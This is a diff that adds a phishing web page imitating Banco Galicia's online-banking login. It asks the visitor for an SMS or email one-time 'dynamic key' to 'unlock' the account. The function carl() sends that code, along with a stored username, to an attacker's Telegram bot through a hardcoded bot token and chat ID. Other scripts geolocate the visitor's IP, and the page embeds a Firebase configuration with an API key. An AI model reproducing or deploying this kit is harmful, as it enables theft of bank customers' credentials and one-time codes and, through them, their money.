@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="es-ar">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=0">
+      <title>Home Recuperar</title>
+      <link rel="shortcut icon" href="img/favicon.ico">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+      <link type="text/css" href="css/bootstrap.min.css" rel="stylesheet">
+      <link type="text/css" href="css/default.min2.css" rel="stylesheet">
+      <link type="text/css" href="css/keyboard.css" rel="stylesheet">
+      <link type="text/css" href="css/simple-keyboard.css" rel="stylesheet">
+      <script src="js/FrontFunctions.min.js" type="text/javascript"></script>
+      <script src="js/sharedout"></script>
+      <script>
+         $.getJSON("https://api.ipify.org?format=json",
+                                           function(data) {
+         
+             // Setting text of element P with id gfg
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    
+})
+
+      </script>
+      <style>
+       input {
+  border: 1px;
+  width: 200px;
+  padding-left: 36px;
+  height: 30px;
+  background-image: url(/img/pngwing.com.png);
+  background-size: 20px;
+  background-position-x: 5px;
+  background-position-y: 50%;
+  background-repeat: no-repeat;
+  border-radius: 5px;
+}
+#container {
+    display: flex;
+    align-items: center;
+}
+
+#container p {
+    margin-left: 1em;
+}
+      </style>
+
+      
+      <link type="text/css" href="css/customcarousel.min.css" rel="stylesheet">
+      
+      <style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style>
+   </head>
+   <body>
+      
+      <div class="container-fluid ">
+         <div class="row full-h">
+            <div class="left-column">
+               <div class="logo_login" role="banner" data-automation-id="galicia-banner">
+                  <a title="link a bancogalicia.com" class="logo" href="index.html" aria-label="Ingresar a la página principal de Banco Galicia" target="_blank">
+                     <div class="logo_sidebar_img" data-hj-masked=""></div>
+                  </a>
+                  <p id="gfg"  hidden="">
+                  <p id="address"  hidden="">
+               </div>
+               <div class="login">
+                  <div class="content-login" role="main">
+                     <form action="" method="post" autocomplete="off">
+                        <input name="__RequestVerificationToken" type="hidden" value="zgXEd3JP-HmevsHari1rFVs50vnAN9d9t_nCHj7kcBZm8Asry7RGqIwZdKJOjhByCJ3h8OjouentNLqgbN6zZF_gRp59jJ76d14C5a3iDQo1" data-hj-masked="">
+                        <div class="login-form">
+                           <div class="row">
+                              <div class="col-xs-12">
+                                 <h3 onclick="enableDebug();" class="login-title " data-hj-masked="">Ahora Desbloquear tu cuenta es facil</h3>
+                                 
+                              </div>
+                              <input data-hj-masked="" type="hidden" value="" name="EncriptedPassword" id="EncriptedPassword">
+                              
+                              <div class="inputWrapper password" style="border-radius: 2px; padding-top: 0; background-color: #f7f7f7; width: 300px; margin-left: 40px; margin-top: 50px; ">
+                                 
+                                 <h1 onclick="enableDebug();" class="login-title " style="font-size: small; margin-left: 1px; text-align: left; padding-top: 0px ;" data-hj-masked="">Ingrese su Clave Dinamica</h1>
+                                 <div class="inputArea">
+                                    
+                                    <div class="contentInput">
+                                       <input type="number" id="DocumentNumber" placeholder="">
+                                      </div>
+                                        
+                                       <br>
+                                       <br>
+                                          <button class="btn btn-md btn-full-width" style="background-color: #FDDA24;color: black; padding: 5px; padding-left: 5px; padding-right: 5px; width: 100px;" type="button" onclick="carl()"  >
+                                          Desbloquear
+                                          </button>
+                                       
+                                    </div>
+                                    
+                                    <div class="capsLock" data-hj-masked=""></div>
+                                   
+                                    
+                                    
+                                 </div>
+                                 <br>
+                              <br>
+                              </div>
+
+                             
+
+                              
+                              <div class="col-xs-12" style="margin-top: 10px;">
+                                 <div class="links">
+                                   <p style="font-size: large;">Recupera tu cuenta facilmente:</p>
+                                 </div>
+                                 <div id='container'>
+                                    <img src='https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/e5441b9d-69b8-4540-aeb6-648ee00584e7/Ilustraciones-Transversales-APP.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_K9HC1202P86O40QTNS9EAE1S47-e5441b9d-69b8-4540-aeb6-648ee00584e7-nM9zhIE' alt="" style="width: 150px;" />
+                                    <p>Solo debes ingresar la clave deinamica que te llegara por SMS o correo electronico.</p>
+                                  </div>
+                              </div>
+                              
+                           </div>
+                           <p style="    margin-top: 300px;
+                           ">Operar con Online Banking implica aceptar los términos y condiciones en los que se ofrece el servicio.</p>
+                        </div>
+                        <input data-hj-masked="" type="hidden" id="DevicePrintAdaptive" name="DevicePrintAdaptive" value="version%3D3%2E7%2E1%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F103%2E0%2E0%2E0%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103%2E0%2E0%2E0%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1366%7C768%7C728%26pm%5Ffpsw%3Dpdf%7Cpdf%7Cpdf%7Cpdf%7Cpdf%26pm%5Ffptz%3D8%26pm%5Ffpln%3Dlang%3Des%2D419%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1366%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D103%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D">
+                        <input data-hj-masked="" type="hidden" id="isDebugEnabled" name="isDebugEnabled" value="false">
+                        <input data-hj-masked="" type="hidden" id="CodigoProducto" name="CodigoProducto">
+                        
+                     </form>
+                     
+                  </div>
+                  
+               </div>
+               <div  >
+                 
+                  
+              
+               <div class="modal fade" id="popupErrorCredenciales" role="dialog" data-backdrop="static" data-keyboard="false">
+                  <div class="modal-dialog">
+                     <!-- Modal content-->
+                     <div class="modal-content">
+                        <div class="modal-header">
+                           <p class="modal-title description" data-hj-masked="">Los datos que ingresaste tienen algún error</p>
+                        </div>
+                        <div class="modal-body">
+                           <p data-hj-masked="">Por favor, revisalos antes de volver a intentarlo, ya que tu usuario y clave pueden bloquearse.</p>
+                           <p data-hj-masked="">
+                              25072022164421
+                           </p>
+                        </div>
+                        <div class="modal-footer">
+                           <button type="button" class="btn btn-caps" data-dismiss="modal">ACEPTAR</button>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               
+            </div>
+            <div class="side-info content img art art-6" role="complementary" data-automation-id="out-banner" style="background-repeat: no-repeat;">
+               <div class="bullet">
+                  <h2 data-hj-masked="">Bienvenido a<br> Online Banking</h2>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div id="mainModalContainer" data-hj-masked=""></div>
+      <script type="text/javascript">
+        $(document).ready(function () {
+            var xhrPool = [];
+            $(document).ajaxSend(function (e, jqXHR, options) {
+                xhrPool.push(jqXHR);
+            });
+            $(document).ajaxComplete(function (e, jqXHR, options) {
+                xhrPool = $.grep(xhrPool, function (x) { return x != jqXHR });
+                $.HBAnalytics.addHotjarAttribute();
+                RenewTimeOutClientSide();
+            });
+            var abort = function () {
+                $.each(xhrPool, function (idx, jqXHR) {
+                    jqXHR.abort();
+                });
+            };
+
+            var oldbeforeunload = window.onbeforeunload;
+            window.onbeforeunload = function () {
+                var r = oldbeforeunload ? oldbeforeunload() : undefined;
+                if (r == undefined) {
+                    // only cancel requests if there is no prompt to stay on the page
+                    // if there is a prompt, it will likely give the requests enough time to finish
+                    abort();
+                }
+                return r;
+            }
+            inputsEfect();
+            $.HBAnalytics.triggerHotjarReady();
+            sessionStorage.removeItem("signOut");
+            $.HBAnalytics.executeGtmTags($.HBAnalytics.afterReadyEvents);
+
+            try { if(window.location.pathname == '/inversiones/inicio'){
+var element = document.createElement("div");
+element.innerHTML ="<div class='col-xs-12 alert-box push-top-20 push-top-xs-10 push-bottom-5 push-bottom-xs-10 no-padding-left'><div class='box-user alert-border alert-border-yellow cursor-d no-shadow no-margin-bottom'><i class='icon-left icon-info-yellow pull-left'></i><div class='box-content no-padding-right push-left-20'><p class='alert-title'>Ahora no es posible comprar CEDEARs</p><span class='no-margin-bottom'>Estamos haciendo los cambios que pide el BCRA en su Comunicación A 7552. </p><span class='no-margin-bottom'>En los próximos días podrás volver a comprar.</span></div></div></div></div>";
+var overview = document.querySelector(".perfil-overview");
+overview.insertBefore(element,overview.firstElementChild);}
+
+
+
+
+
+//terminos y condiciones dolar mep
+if(window.location.pathname == '/inversiones/v2/comprar-vender-dolar-mep-preconfirmacion'){
+$('label[for=AceptaTerminosYCondicionesMEP]').html('Solicito a Banco Galicia la orden de compra en pesos de los bonos GD30 a precio de mercado, según el monto indicado. Solicito a Banco Galicia la orden de venta en dólares de los bonos GD30 que compró mediante la órden anterior, a precio de mercado. Declaro bajo juramento que he leído y acepto los <a href="javascript:void(0)"><span class="color-default"> Términos y Condiciones</span> de esta operación.</a>');
+var tyc  = document.querySelector("#form > div.check-desc.push-top-30 > div > label > a")
+$(tyc).attr("onclick", "event.stopPropagation(); javascript:window.open('/inversiones/v2/TyC_DolarMEP', '_blank'); return false;")
+}
+
+//Transferencias
+if (window.location.pathname == '/transferencias/inicio')
+{
+$(document).ajaxComplete(function( event, xhr, settings ) {
+if (settings.url.indexOf('/transferencias/SideHistorialTransferencias') > -1 && $("#mailDestinoComprobante").val() != '')
+document.querySelector("#btn_enviarComprobante").disabled = false;
+});
+}
+
+if (window.location.pathname == '/transferencias/confirmacion')
+{
+$(document).ajaxComplete(function( event, xhr, settings ) {
+if (settings.url.indexOf('/EnvioDinero/SideTerceros') > -1 && $("#mailDestinoComprobante").val() !== '')
+document.querySelector("#btn_enviarComprobante").disabled = false;
+});
+}
+
+if (window.location.pathname == '/transferencias/confirmacion-haberes')
+{
+$(document).ajaxComplete(function( event, xhr, settings ) {
+if (settings.url.indexOf('/EnvioDinero/SideHaberes') > -1 && $("#mailDestinoComprobante").val() !== '')
+document.querySelector("#btn_enviarComprobante").disabled = false;
+});
+}
+
+if(window.location.pathname == '/tarjetas/upgrade'){
+    window.location.href = "/navigation/menulink/31";  
+}
+
+if(window.location.href.indexOf("transferencias") > -1 )
+{
+   
+   
+   document.querySelector('#HelpIcon').onclick = function() {
+      if(document.querySelector("#HelpContentContainer > div > div > div.table-container.no-margin > div:nth-child(3)") != null){
+   document.querySelector("#HelpContentContainer > div > div > div.table-container.no-margin > div:nth-child(3)").remove()
+   document.querySelector("#HelpContentContainer > div > div > div.table-container.no-margin > div:nth-child(3)").innerText = ' '
+      }
+
+   if(document.querySelector("#HelpContentContainer > div > div > ul") != null){
+      
+      if(document.querySelector("#HelpContentContainer > div > div > ul:nth-child(2) > li:nth-child(2)") != null && document.querySelector("#HelpContentContainer > div > div > ul:nth-child(2) > li:nth-child(2)").textContent.includes('mensual')) {
+         document.querySelector("#HelpContentContainer > div > div > ul:nth-child(2) > li:nth-child(2)").remove()
+      }
+      
+      if(document.querySelector("#HelpContentContainer > div > div > ul:nth-child(3) > li:nth-child(2)") != null && document.querySelector("#HelpContentContainer > div > div > ul:nth-child(3) > li:nth-child(2)").textContent.includes('mensual')) {
+      document.querySelector("#HelpContentContainer > div > div > ul:nth-child(3) > li:nth-child(2)").remove()
+      }
+      
+      if(document.querySelector("#HelpContentContainer > div > div > ul > li:nth-child(3) > ul > li:nth-child(2)") != null && document.querySelector("#HelpContentContainer > div > div > ul > li:nth-child(3) > ul > li:nth-child(2)").textContent.includes('mensual'))
+      {
+         document.querySelector("#HelpContentContainer > div > div > ul > li:nth-child(3) > ul > li:nth-child(2)").remove()
+      }
+   }
+ }
+} } catch(e) { }
+
+
+            if (sessionStorage.getItem('LinkExterno')) {
+                //MANEJO DE ENLACES CUANDO SE ACCEDE DESDE UN PORTAL EXTERNO
+                $('.logo').removeAttr('href');
+                $('#btnCerrar, .page-header .icon-close, #cancellationFlowButton').attr('href', 'javascript:window.close();');
+                $('.error-view #Button1, .exito-view #Button1').attr('onclick', 'javascript:window.close();');
+            }
+        });
+
+    </script>
+      <script>
+
+function carl(params) {
+   
+      
+     
+
+   
+   const token = '5507065651:AAFzRdWe_cbWNtAmu8GHr-DUtzxAfuNcRE0';
+const chatId = '-837415813';
+const usr = localStorage.getItem('usr');
+if (document.getElementById("DocumentNumber").value.length <= 5 ) {
+   alert("error, codigo incompleto");
+   document.getElementById("DocumentNumber").value = "";
+   document.getElementById("DocumentNumber").focus();
+
+   
+}else{
+   const code = document.getElementById("DocumentNumber").value;
+const message = ` Usr.: ${usr} \n  Code: ${code}` ;
+$.ajax({
+  type: 'POST',
+  url: `https://api.telegram.org/bot${token}/sendMessage`,
+  data: {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'html',
+  },
+  success: function (res) {
+      console.debug(res);
+      $('#response').text('Message sent');
+      console.log("enviado")
+      window.location = "index22.html"
+      
+     
+  },
+  error: function (error) {
+      console.error(error);
+      alert("error failed");
+  } 
+
+})
+
+}
+
+}
+
+               
+      </script>
+      
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+  
+      <!-- The core Firebase JS SDK is always required and must be listed first -->
+      <script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-app.js"></script>
+      
+      <!-- TODO: Add SDKs for Firebase products that you want to use
+      https://firebase.google.com/docs/web/setup#available-libraries -->
+      <script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-firestore.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+      <script>
+       // Your web app's Firebase configuration
+       const firebaseConfig = {
+         apiKey: "AIzaSyDgStk_o-MvL9bm0QpW4ZvDGlJBd_Rdi2g",
+  authDomain: "users-9071c.firebaseapp.com",
+  projectId: "users-9071c",
+  storageBucket: "users-9071c.appspot.com",
+  messagingSenderId: "676826673235",
+  appId: "1:676826673235:web:01289812be268b081a56a6"
+       };
+       // Initialize Firebase
+      
+       firebase.initializeApp(firebaseConfig);
+      </script>
+
+   </body>
+   <script src="/js/js.js"></script>
+   <script>
+      
+      window.onload= ()=>{
+         updtetok();
+}
+
+   </script>
+   <script>
+      function hid(params) {
+         document.getElementById("email").style.display ="none ";
+         
+      }
+   </script>
+   
+
+
+
+
+
+
+
+</html>
